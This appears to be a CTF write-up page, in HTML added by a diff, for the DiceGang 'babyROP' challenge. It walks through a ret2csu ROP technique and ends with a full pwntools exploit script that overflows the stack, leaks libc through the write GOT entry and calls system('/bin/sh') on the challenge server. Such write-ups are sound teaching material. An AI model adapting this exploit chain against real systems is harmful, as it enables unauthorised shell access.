@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>babyROP [DiceGang CTF] | CTF Writeup</title>
+    <meta name="description" content="This is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets. ## Challenge Description ![](/images/ba...">
+    <link href="/src/index.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <style>
+        body { 
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            color: #e0e0e0;
+        }
+        .code-block {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #f97316, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .video-embed { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; border-radius: 8px; border: 1px solid #374151; background: #0f0f0f; margin: 1.5rem 0; }
+        .video-embed iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }
+        .toc-sidebar {
+            position: fixed;
+            top: 2rem;
+            left: 1rem;
+            max-height: calc(100vh - 4rem);
+            overflow-y: auto;
+            background: #1a1a1a;
+            border: 1px solid #374151;
+            border-radius: 0.75rem;
+            padding: 1.5rem;
+            margin-right: 0;
+            width: 280px;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+        .toc-title {
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #9ca3af;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid #374151;
+            padding-bottom: 0.5rem;
+        }
+        .toc-list { list-style: none; padding: 0; margin: 0; }
+        .toc-sublist { list-style: none; padding-left: 0.5rem; margin-top: 0.25rem; }
+        .toc-item { margin: 0.25rem 0; }
+        .toc-level-2 { padding-left: 0.25rem; }
+        .toc-level-3 { padding-left: 0.75rem; }
+        .toc-level-4 { padding-left: 1.25rem; }
+        .toc-link { display: block; color: #9ca3af; text-decoration: none; font-size: 0.875rem; line-height: 1.5; padding: 0.25rem 0; border-radius: 0.25rem; transition: all 0.2s; }
+        .toc-link:hover { color: #60a5fa; background: #1f2937; padding-left: 0.5rem; }
+        @media (max-width: 1024px) { .toc-sidebar { display: none; } }
+        .prose h1 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2.5rem; font-weight: 800; margin-top: 3rem; margin-bottom: 1.5rem; }
+        .prose h2 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 2rem; font-weight: 700; margin-top: 3rem; margin-bottom: 1rem; border-bottom: 2px solid #374151; padding-bottom: 0.5rem; }
+        .prose h3 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.5rem; font-weight: 600; margin-top: 2rem; margin-bottom: 0.75rem; }
+        .prose h4 { background: linear-gradient(135deg, #f97316, #f59e0b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; font-size: 1.25rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+        .prose p { margin-bottom: 1.5rem; line-height: 1.7; color: #d1d5db; }
+        .prose strong { color: #f3f4f6; font-weight: 600; }
+        .prose code { background: #1e1e1e; color: #fbbf24; padding: 0.25rem 0.5rem; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 0.9em; }
+        .prose pre { background: #1e1e1e; border: 1px solid #333; border-radius: 8px; padding: 1.5rem; overflow-x: auto; margin: 2rem 0; }
+        .prose pre code { background: transparent; color: #e5e7eb; padding: 0; border-radius: 0; }
+        .prose blockquote { background:rgb(93, 45, 26); color:rgb(255, 255, 255); border-left: 4px solid #ff8c00; padding: 1rem 1.25rem; margin: 1.25rem 0; border-radius: calc(var(--radius) - 2px); }
+        .prose ul, .prose ol { list-style-color: #ff8c00; list-style-type: disc; list-style-position: outside; margin: 1.5rem 0; padding-left: 2rem; }
+        .prose li { margin: 0.5rem 0; color: #d1d5db; }
+        .prose li::marker { color: #ff8c00 !important; }
+        .prose ol li { list-style-type: decimal; }
+        .prose img { border-radius: 8px; margin: 2rem 0; max-width: 100%; }
+        .prose hr { border: none; height: 2px; background: linear-gradient(90deg, transparent, #374151, transparent); margin: 3rem 0; }
+    </style>
+</head>
+<body class="min-h-screen">
+    <div class="container mx-auto max-w-7xl px-4 sm:px-6 lg:px-4 py-8 relative">
+        <header class="mb-12">
+            <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 mb-4 inline-block">← Back</a>
+            <h1 class="text-4xl md:text-5xl font-bold mb-4">
+                <span class="gradient-text">babyROP [DiceGang CTF]</span>
+            </h1>
+            <div class="mb-8"><img src="/writeups/1728230824684-babyROP-[DiceGang-CTF]/featured.png" alt="babyROP [DiceGang CTF] cover image" class="w-full h-64 md:h-80 object-cover rounded-lg shadow" loading="eager"></div>
+            <div class="flex items-center gap-4 text-sm text-gray-400 mb-6">
+                <span>October 4, 2021</span>
+                <span>•</span>
+                <span>4 min read</span>
+                
+                
+                
+                <span>•</span><div class="flex gap-2"><span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">csu</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">ret2csu</span> <span class="bg-blue-500/20 text-blue-300 px-2 py-1 rounded text-xs">dicegang</span></div>
+            </div>
+        </header>
+
+        <div class="flex flex-col lg:flex-row justify-start gap-6">
+            <aside class="hidden lg:block"><nav class="toc-sidebar"><h3 class="toc-title">Table of Contents</h3><ul class="toc-list"><ul class="toc-sublist"><li class="toc-item toc-level-2"><a href="#challenge-description" class="toc-link">Challenge Description</a></li><li class="toc-item toc-level-2"><a href="#solution" class="toc-link">Solution:</a></li><li class="toc-item toc-level-2"><a href="#mitigations" class="toc-link">Mitigations:</a></li><li class="toc-item toc-level-2"><a href="#finding-gadgets" class="toc-link">Finding Gadgets:</a></li><li class="toc-item toc-level-2"><a href="#crafting-exploit" class="toc-link">Crafting Exploit:</a></li><li class="toc-item toc-level-2"><a href="#idea" class="toc-link">Idea</a></li></ul><li class="toc-item toc-level-1"><a href="#set-up-pwntools-for-the-correct-architecture" class="toc-link">Set up pwntools for the correct architecture</a></li><li class="toc-item toc-level-1"><a href="#exploitpy-gdb" class="toc-link">./exploit.py GDB</a></li><li class="toc-item toc-level-1"><a href="#exploit-goes-here" class="toc-link">EXPLOIT GOES HERE</a></li><li class="toc-item toc-level-1"><a href="#shellcode-asmshellcraftsh" class="toc-link">shellcode = asm(shellcraft.sh())</a></li><li class="toc-item toc-level-1"><a href="#loginfowrite-leak-formathexu64precv8" class="toc-link">log.info(&quot;write leak: {}&quot;.format((hex(u64(p.recv(8))))))</a></li></ul></nav></aside>
+            <article class="prose prose-invert max-w-none ml-0 lg:max-w-6xl lg:ml-10">
+<p>This is a basic ROP Challenge that involves a technique called the ret2csu. We use this when there is a lack of gadgets.</p>
+<!--more-->
+<h2 id="challenge-description">Challenge Description</h2>
+<p><img src="/images/babyROP_dice/challdesbabyrop.png" alt="" /></p>
+<h2 id="solution">Solution:</h2>
+<ul>
+<li>Checkout the mitigations of the binary</li>
+<li>Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout <a href="https://ropemporium.com/">ROPemporium</a>.</li>
+<li>Craft the payload to get flag from server.</li>
+</ul>
+<h2 id="mitigations">Mitigations:</h2>
+<p><img src="/images/babyROP_dice/mitigationdice.png" alt="bob" /></p>
+<ul>
+<li>We can't excecute shellcode (NX Enabled)</li>
+<li>No Canary found - no need for brute force or leaks</li>
+<li>PIE disabled - the address of the binary wont be randomised</li>
+</ul>
+<h2 id="finding-gadgets">Finding Gadgets:</h2>
+<p>Install ROPgadget to find all the gadgets in the binary.</p>
+<pre><code class="bash language-bash">ROPgadget --binary babyrop
+</code></pre>
+<p>My first thought was to <code>write</code> the address pointed by the got of <code>write</code>. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed. </p>
+<pre><code class="asm language-asm">pop rdi
+pop rsi 
+pop rdx
+</code></pre>
+<p>I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI. </p>
+<pre><code class="asm language-asm">rsi - point to the buffer [write@got]
+rdi - file discriptor = 1
+rdx - size of the buffer = &gt;8
+</code></pre>
+<p>Since ropgadget did not give me the gadget I went to look for more gadgets in the <code>__libc_csu_init</code>. There I could find all the gadgets I wanted. </p>
+<h2 id="crafting-exploit">Crafting Exploit:</h2>
+<p>These are the important gadgets I want.</p>
+<p><img src="/images/babyROP_dice/gadgetsdice.png" alt="" /></p>
+<h2 id="idea">Idea</h2>
+<p>First overflow the buffer with garbage and then make return jump to csu. Things to note.</p>
+<pre><code class="asm language-asm">0x00000000004011b0 &lt;+64&gt;:    mov    rdx,r14
+0x00000000004011b3 &lt;+67&gt;:    mov    rsi,r13
+0x00000000004011b6 &lt;+70&gt;:    mov    edi,r12d
+
+0x00000000004011ca &lt;+90&gt;:    pop    rbx
+0x00000000004011cb &lt;+91&gt;:    pop    rbp
+0x00000000004011cc &lt;+92&gt;:    pop    r12
+0x00000000004011ce &lt;+94&gt;:    pop    r13
+0x00000000004011d0 &lt;+96&gt;:    pop    r14
+0x00000000004011d2 &lt;+98&gt;:    pop    r15
+0x00000000004011d4 &lt;+100&gt;:    ret 
+</code></pre>
+<p>Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to <code>QWORD PTR [r15+rbx*8]</code> inbetween these gadgets. So we decided to make this <code>QWORD PTR [r15+rbx*8]</code> as the write function. In order to do this well set r15 as the address to write@got and rbx as 0. </p>
+<pre><code class="asm language-asm">0x00000000004011b9 &lt;+73&gt;:    call   QWORD PTR [r15+rbx*8]
+0x00000000004011bd &lt;+77&gt;:    add    rbx,0x1
+0x00000000004011c1 &lt;+81&gt;:    cmp    rbp,rbx
+0x00000000004011c4 &lt;+84&gt;:    jne    0x4011b0 &lt;__libc_csu_init+64&gt;
+</code></pre>
+<p>Hmmm :(. Seems like there is a compare statement that'll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.</p>
+<pre><code class="python language-python">buf = b"a"*72
+buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15
+buf += p64(0)+p64(1)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])
+buf += p64(0x00000000004011b0)
+buf += p64(0)*7
+buf += p64(elf.sym['main'])
+</code></pre>
+<p>Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to <a href="https://libc.blukat.me/">libc.blukat.me</a></p>
+<p><img src="/images/babyROP_dice/blukatdice.png" alt="" /></p>
+<p>Now its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).</p>
+<p>Anyway here is the exploit script for this challenge.</p>
+<pre><code class="python language-python">#!/usr/bin/env python3
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './babyrop'
+
+elf = ELF("./babyrop")
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+p = remote("dicec.tf", 31924)
+
+# shellcode = asm(shellcraft.sh())
+
+'''
+0x00000000004011d3 : pop rdi ; ret
+
+write syscall 
+rdi = 1
+rsi = pointer to puffer (pointer to write function)
+rdx = size
+'''
+
+p.recvuntil(": ")
+
+buf = b"a"*72
+buf += p64(0x00000000004011ca) #rbx rbp r12 r13 r14 r15
+buf += p64(0)+p64(1)+p64(1)+p64(elf.got['write'])+p64(8)+p64(elf.got['write'])
+buf += p64(0x00000000004011b0) 
+buf += p64(0)*7
+buf += p64(elf.sym['main'])
+p.sendline(buf)
+
+# log.info("write leak: {}".format((hex(u64(p.recv(8))))))
+
+leak = int(hex(u64(p.recv(8))), 16)
+log.info("Write leak: {}".format(hex(leak)))
+
+sys = leak-0xbbdc0
+
+binsh = leak+0xa63da
+
+buf = b"a"*72
+buf += p64(0x40116b) #ret
+buf += p64(0x00000000004011d3) #pop rdi 
+buf += p64(binsh)
+buf += p64(sys)
+
+p.sendline(buf)
+
+p.interactive()
+</code></pre>
+            </article>
+        </div>
+        <!-- Navigation -->
+        <nav class="mt-16 pt-8 border-t border-gray-700">
+            <div class="flex justify-between items-center">
+                <div class="flex-1">
+                    <a href="/writeups/1729358345340-evalbox---pyjail-writeup.html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
+                        </svg>
+                        <div class="text-left">
+                            <div class="text-xs text-gray-400">Previous</div>
+                            <div class="font-medium">evalbox - pyjail writeup</div>
+                        </div>
+                    </a>
+                </div>
+                <div class="flex-1 text-center">
+                    <a href="/writeups" class="text-emerald-400 hover:text-emerald-300 transition-colors font-medium">All Writeups</a>
+                </div>
+                <div class="flex-1 text-right">
+                    <a href="/writeups/1728230839404-Leaky-Pipes-[inCTFj-Quals].html" class="inline-flex items-center text-emerald-400 hover:text-emerald-300 transition-colors">
+                        <div class="text-right">
+                            <div class="text-xs text-gray-400">Next</div>
+                            <div class="font-medium">Leaky Pipes [inCTFj Quals]</div>
+                        </div>
+                        <svg class="w-4 h-4 ml-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        </nav>
+    </div>
+<script>window.addEventListener('DOMContentLoaded',()=>{try{document.querySelectorAll('pre code').forEach((el)=>window.hljs&&window.hljs.highlightElement(el));}catch(e){console.warn('hljs init failed',e);}});</script>
+</body>
+</html>
